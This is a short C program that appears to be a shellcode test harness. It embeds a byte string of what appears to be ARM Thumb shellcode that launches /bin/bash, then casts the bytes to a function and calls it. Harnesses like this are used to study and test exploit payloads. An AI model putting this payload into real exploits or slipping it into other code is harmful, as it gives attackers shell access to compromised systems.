	#include <stdio.h>
	#include <string.h>
	
	int main()
	{
		unsigned char shellcode[] ="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x42\x72\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x58\xc0\x46";
		
		printf("The length is %d\n", strlen(shellcode));
		int (*ret)() = (int(*)()) shellcode;
		
		ret();
	}